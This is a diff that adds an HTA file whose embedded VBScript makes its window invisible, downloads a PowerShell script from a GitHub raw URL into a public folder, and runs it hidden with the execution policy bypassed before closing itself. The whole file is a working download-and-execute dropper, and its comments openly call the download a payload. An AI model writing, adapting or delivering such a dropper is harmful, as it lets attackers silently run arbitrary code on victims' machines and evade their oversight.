@@ -1,0 +1,49 @@
+<html>
+<head>
+<script language="VBScript">
+    ' Make the HTA window invisible
+    window.resizeTo 0, 0
+    window.moveTo -2000, -2000
+
+    ' Function to download and execute our original payload
+    Sub ExecutePayload()
+        On Error Resume Next ' Continue if an error occurs
+
+        ' URL of your actual PowerShell script (teste.ps1)
+        ps_script_url = "https://raw.githubusercontent.com/icesousa/raspberry/main/teste.ps1"
+
+        ' Path to save the downloaded script
+        save_path = "C:\Users\Public\teste.ps1"
+
+        ' Create objects needed for download and file operations
+        Set http = CreateObject("MSXML2.ServerXMLHTTP")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set shell = CreateObject("WScript.Shell")
+
+        ' Download the PowerShell script
+        http.open "GET", ps_script_url, False
+        http.send
+        If http.Status = 200 Then
+            ' If download is successful, write the file to disk
+            Set fileStream = CreateObject("ADODB.Stream")
+            fileStream.Open
+            fileStream.Type = 1 ' adTypeBinary
+            fileStream.Write http.responseBody
+            fileStream.SaveToFile save_path, 2 ' adSaveCreateOverWrite
+            fileStream.Close
+
+            ' Execute the downloaded PowerShell script silently
+            shell.Run "powershell.exe -ExecutionPolicy Bypass -File " & save_path, 0, false
+        End If
+
+        ' Close the HTA application
+        window.close()
+    End Sub
+
+    ' Call the main function
+    ExecutePayload
+</script>
+</head>
+<body>
+</body>
+</html>
